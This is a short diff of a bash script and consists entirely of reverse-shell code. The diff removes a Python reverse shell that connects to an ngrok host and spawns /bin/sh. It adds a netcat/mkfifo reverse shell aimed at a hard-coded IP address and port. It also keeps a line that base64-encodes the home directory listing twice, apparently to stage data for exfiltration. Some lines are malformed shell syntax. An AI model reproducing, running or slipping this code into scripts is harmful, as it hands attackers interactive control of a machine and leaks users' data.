@@ -1,7 +1,6 @@
 #!/bin/bash
 
-export RHOST="0.tcp.eu.ngrok.io";export RPORT=15522;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-
+bash -i  rm /tmp/f>/dev/null 2>&1;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 18.198.77.177 17446 >/tmp/f 
 
 $B64_BLOB=`ls $HOME | base64 | base64`
 
